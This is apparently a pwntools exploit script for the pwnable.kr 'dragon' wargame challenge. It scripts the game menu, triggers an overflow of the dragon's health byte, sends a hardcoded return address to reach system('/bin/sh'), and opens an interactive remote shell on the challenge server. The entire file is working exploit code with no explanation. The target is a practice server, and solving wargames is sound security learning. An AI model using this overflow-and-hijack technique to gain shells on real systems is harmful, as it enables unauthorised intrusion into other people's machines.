from pwn import *

context.log_level="debug"

#p = remote("127.0.0.1", 3333)
p = remote("pwnable.kr", 9004)
# enter mama dragon
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("1")

# beat mama dragon with overflow byte
for i in range(4):
    print p.recv()
    p.sendline("3")
    print p.recv()
    p.sendline("3")
    print p.recv()
    p.sendline("2")
    
# call system("/bin/sh")
p.sendline(p32(0x8048dbf))
print p.recv()

p.interactive()
